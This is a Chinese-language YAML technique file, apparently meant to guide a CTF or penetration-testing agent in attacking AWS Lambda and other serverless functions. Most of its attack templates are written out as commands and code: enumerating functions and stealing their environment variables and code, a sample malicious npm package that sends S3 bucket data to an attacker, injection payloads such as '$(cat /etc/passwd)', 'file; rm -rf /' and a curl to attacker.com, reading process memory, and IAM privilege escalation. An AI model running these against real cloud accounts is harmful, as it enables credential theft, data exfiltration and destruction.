name: serverless_security
description: 无服务器安全 - 涵盖Lambda函数攻击、云函数漏洞、Serverless应用渗透测试技术
version: "2.0"
author: CTF-Agent Team
tags: [serverless, lambda, cloud-function, aws, azure, gcp]
priority: medium

# 使用场景
scenarios:
  - AWS Lambda安全评估
  - Azure Functions渗透测试
  - GCP Cloud Functions漏洞挖掘
  - Serverless应用安全审计
  - FaaS平台安全研究

# 核心技术
techniques:
  - Lambda函数攻击: AWS Lambda漏洞利用
  - 环境变量泄露: 窃取函数环境变量
  - 依赖包攻击: 通过依赖注入恶意代码
  - 内存取证: 从函数内存提取敏感信息
  - 冷启动攻击: 利用冷启动时序漏洞
  - 资源耗尽: 函数资源限制绕过

# 工具列表
tools:
  - AWS CLI: AWS命令行工具
  - Lambda Tools: Lambda安全工具
  - Serverless Framework: Serverless框架
  - Pacu: AWS渗透框架
  - CloudGoat: AWS脆弱环境
  - Azucar: Azure安全审计
  - GCP Scanner: GCP安全扫描

# Serverless架构理解
serverless_architecture:
  - providers:
      AWS Lambda: AWS无服务器函数
      Azure Functions: Azure函数服务
      GCP Cloud Functions: Google云函数
      Alibaba Function Compute: 阿里云函数计算
      Tencent SCF: 腾讯云无服务器

  - characteristics:
      Event-driven: 事件驱动执行
      Stateless: 无状态设计
      Ephemeral: 短暂执行环境
      Cold Start: 冷启动延迟
      Resource Limits: 资源限制

  - event_sources:
      API Gateway: HTTP API触发
      S3: 存储事件触发
      DynamoDB: 数据库流触发
      SQS/SNS: 消息队列触发
      CloudWatch: 监控事件触发
      Scheduled: 定时触发

# AWS Lambda攻击
aws_lambda_attack:
  - function_enumeration:
    template: |
      # Lambda函数枚举

      # 1. 列出所有函数
      aws lambda list-functions --region us-east-1

      # 2. 获取函数详情
      aws lambda get-function --function-name target-function

      # 3. 获取函数代码
      aws lambda get-function --function-name target-function --query 'Code.Location'

      # 4. 获取环境变量
      aws lambda get-function-configuration --function-name target-function --query 'Environment.Variables'

      # 5. 获取函数策略
      aws lambda get-policy --function-name target-function

      # 6. 查看函数日志
      aws logs describe-log-streams --log-group-name /aws/lambda/target-function

  - environment_variable_leak:
    template: |
      # Lambda环境变量泄露

      # 常见敏感环境变量:
      # - DATABASE_URL
      # - API_KEY
      # - SECRET_TOKEN
      # - AWS_ACCESS_KEY_ID (如果错误配置)
      # - PASSWORD

      # 1. 直接获取
      aws lambda get-function-configuration \
        --function-name target \
        --query 'Environment.Variables'

      # 2. 通过日志获取
      # 函数可能打印环境变量
      aws logs get-log-events \
        --log-group-name /aws/lambda/target \
        --log-stream-name stream-name

      # 3. 通过代码获取
      # 下载函数代码分析

      # 下载代码
      code_url = aws lambda get-function --function-name target --query 'Code.Location'
      wget $code_url

      # 分析代码查找敏感信息
      grep -r "process.env" function.zip
      grep -r "SECRET" function.zip

      # 4. 通过错误消息获取
      # 触发函数错误可能泄露信息

  - code_extraction:
    template: |
      # Lambda代码提取

      # 1. 获取代码位置
      aws lambda get-function --function-name target

      # 输出包含:
      # {
      #   "Code": {
      #     "RepositoryType": "S3",
      #     "Location": "https://s3.amazonaws.com/..."
      #   }
      # }

      # 2. 下载代码
      curl -o function.zip "https://s3.amazonaws.com/..."

      # 3. 解压分析
      unzip function.zip
      cat index.js  # 或其他主文件

      # 4. 查找敏感信息
      grep -E "(password|secret|key|token)" -r .

      # 5. 分析依赖
      cat package.json
      cat requirements.txt

      # 查找可能的依赖漏洞

  - dependency_attack:
    template: |
      # Lambda依赖攻击

      # 1. 供应链攻击

      # Lambda函数使用外部依赖
      # 可以通过:
      # - 植入恶意npm包
      # - 植入恶意pip包
      # - 修改现有包

      # 示例恶意依赖
      malicious_package = """
      // package.json中的依赖
      "dependencies": {
          "lodash": "^4.17.21",
          "malicious-helper": "^1.0.0"  // 植入恶意包
      }

      // malicious-helper/index.js
      const AWS = require('aws-sdk');
      const s3 = new AWS.S3();

      module.exports = {
          helper: function() {
              // 隐藏的恶意操作
              s3.listBuckets().promise()
                  .then(data => sendToAttacker(data));
          }
      }
      """

      # 2. 植入方式

      # 如果有代码修改权限:
      # - 直接修改依赖
      # - 更新package.json/requirements.txt
      # - 上传新版本函数

      # 3. 利用现有漏洞

      # 检查函数依赖漏洞
      npm audit
      pip safety check

      # 利用已知CVE

  - lambda_injection:
    template: |
      # Lambda输入注入

      # 1. 通过API Gateway注入

      # Lambda函数可能处理API输入
      # 输入验证不当可能导致注入

      # 测试注入
      curl -X POST https://api-id.execute-api.region.amazonaws.com/prod/function \
        -H "Content-Type: application/json" \
        -d '{"input": "$(cat /etc/passwd)"}'

      # 2. 通过事件注入

      # S3事件触发
      # 文件名注入
      filename = "file; rm -rf /"

      # SQS消息注入
      message_body = '{"key": "value", "malicious": "payload"}'

      # 3. 环境注入

      # 如果函数使用环境变量拼接命令
      # 环境变量注入

      process.env.USER_INPUT = "'; curl attacker.com; '"

  - memory_extraction:
    template: |
      # Lambda内存提取

      # Lambda执行时敏感数据可能在内存中

      # 1. 通过函数代码读取内存

      # Python Lambda
      import ctypes
      import os

      def lambda_handler(event, context):
          # 尝试读取内存
          # 获取进程内存映射
          maps = open('/proc/self/maps').read()

          # 读取内存区域
          for line in maps.split('\n'):
              if 'rw' in line:  # 可读写区域
                  addr_range = line.split()[0]
                  start, end = [int(x, 16) for x in addr_range.split('-')]
                  size = end - start

                  # 尝试读取
                  try:
                      mem = open('/proc/self/mem', 'rb')
                      mem.seek(start)
                      data = mem.read(size)
                      # 分析数据寻找敏感信息
                  except:
                      pass

      # 2. 通过临时文件提取

      # Lambda有/tmp目录
      # 检查临时文件

      import os
      tmp_files = os.listdir('/tmp')
      for f in tmp_files:
          content = open(f).read()
          if 'secret' in content or 'password' in content:
              print(content)

      # 3. 通过日志泄露

      # 函数可能意外打印敏感数据
      # 检查CloudWatch Logs

      aws logs get-log-events --log-group-name /aws/lambda/target

  - privilege_escalation:
    template: |
      # Lambda权限提升

      # 1. IAM角色滥用

      # Lambda有执行角色
      # 检查角色权限

      aws lambda get-function-configuration \
        --function-name target \
        --query 'ExecutionRoleArn'

      # 获取角色权限
      aws iam get-role-policy --role-name lambda-role --policy-name policy-name

      # 2. 利用高权限角色

      # 如果角色有广泛权限
      # 可以:
      # - 创建新IAM用户
      # - 修改其他资源
      # - 访问敏感S3 bucket

      # 示例: 如果Lambda有s3:*权限
      def lambda_handler(event, context):
          s3 = boto3.client('s3')
          # 列出所有bucket
          buckets = s3.list_buckets()
          # 下载敏感数据
          s3.download_file('sensitive-bucket', 'secret.txt', '/tmp/secret.txt')

      # 3. AssumeRole利用

      # 如果角色可以AssumeRole到更高权限角色

      sts = boto3.client('sts')
      assumed = sts.assume_role(
          RoleArn='arn:aws:iam::123456789012:role/AdminRole',
          RoleSessionName='Session'
      )

      # 使用临时凭证
      creds = assumed['Credentials']

